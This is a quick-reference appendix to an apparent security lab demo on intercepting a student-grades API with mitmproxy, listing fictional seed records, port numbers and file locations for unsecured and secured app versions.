# **Appendix: Quick Reference**

## **Student Database - Seed Data**

| **Student ID** | **Name & Grade**                  | **Used In Demo**                               |
| -------------- | --------------------------------- | ---------------------------------------------- |
| **S001**       | Ahmed Khan - Grade F, Marks 38    | The VICTIM - logged in user, has failing grade |
| **S002**       | Sara Ali - Grade A, Marks 92      | The TARGET - attacker wants her grade          |
| **S003**       | Bilal Hassan - Grade B, Marks 75  | Extra test data                                |
| **S004**       | Fatima Malik - Grade A+, Marks 98 | Extra test data                                |
| **S005**       | Usman Sheikh - Grade C, Marks 60  | Extra test data                                |

## **Port Reference**

| **5000** | Flask API server (Windows) - main API port |
| -------- | ------------------------------------------ |
| **8080** | mitmproxy (Kali) - attack proxy port       |

## **File Locations Summary**

| **config.py**           | C:\\student_api\\config.py           |
| ----------------------- | ------------------------------------ |
| **database.py**         | C:\\student_api\\database.py         |
| **middleware.py**       | C:\\student_api\\middleware.py       |
| **app_unsecured.py**    | C:\\student_api\\app_unsecured.py    |
| **app_secured.py**      | C:\\student_api\\app_secured.py      |
| **student_portal.html** | Windows Desktop\\student_portal.html |
| **intercept_grade.py**  | Kali: ~/intercept_grade.py           |

_- End of Document -_